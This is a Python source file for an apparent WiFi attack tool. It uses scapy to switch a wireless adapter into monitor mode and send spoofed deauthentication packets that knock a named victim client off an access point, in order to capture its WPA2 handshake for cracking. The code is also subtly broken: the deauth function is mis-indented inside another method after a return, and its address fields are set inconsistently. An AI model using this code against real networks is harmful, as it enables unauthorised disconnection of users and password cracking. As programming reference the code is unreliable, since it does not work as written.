from os import geteuid
from util.IO import IO
from scapy.all import *
from netifaces import interfaces
from subprocess import Popen, PIPE

''' 
    Class responsible for automating the process of recording 
    access point information and capturing WPA2 handshakes.
'''
class WiFi:

    '''
        Constructor for the WiFi class.
    '''
    def __init__(self):
        self.NICs = []
        self.SSIDs = {}
        self.device = ''
        self.deauth = rdpcap('../artifacts/deauth.pcap', count = 1)[0]

    '''
        Searches for all available NIC's and returns
        a list of NIC's that can be used in monitor mode.
    '''
    def scanAdapters(self):
        nic = []

        for dev in interfaces():
            if 'lo' not in dev and 'eno' not in dev and 'vm' not in dev:
                nic.append(dev)
        self.NICs = nic

    '''
        Parses the list of available NIC's and sets the
        first available device to monitor mode. 
        Sets the value of self.NIC to the name of the NIC
        in monitor mode. 
        @return: Boolean value representing success of method execution.
    '''
    def setMonMode(self):
        success = False

        if geteuid() != 0:
            IO.writeToErrorLog('You must run this program as root.')
            return success

        for dev in self.NICs:
            try:
                # Shut down the device
                msg = Popen(['ifconfig', dev, 'down'], stderr = PIPE)
                msg.communicate() # Not saving output.

                # Attempt to put device in monitor mode
                msg = Popen(['iwconfig', dev, 'mode', 'monitor'], stderr = PIPE)
                msg.communicate() # Not saving output.

                self.device = dev
                success = True
                break

            except Exception as e:
                IO.writeToErrorLog(e)
            return success

        '''
            Sends a spoofed deauth packet from the client (CLI) to the access point
            (AP) in order to generate a 3-way handshake upon reconnection.
            @param SMAC: MAC of victim that will deauthenticate with the AP.
            @param DMAC: MAC of AP that will receive victim deauth packet.
            @return: Boolean value representing the success of the method.
        '''
        def sendDeauth(self, SMAC, DMAC):
            # Receiver MAC (Dst)
            self.deauth.addr1 = DMAC
            # Destination MAC
            self.deauth.addr2 = DMAC
            # Transmitter MAC (Src)
            self.deauth.addr3 = SMAC
            # Source MAC -> BSSID MAC in WireShark, not required in Scapy?
            self.deauth.addr4 = SMAC

            try:
                # Send packet on layer 2
                srp(self.deauth)
            except Exception as e:
                IO.writeToErrorLog(e)

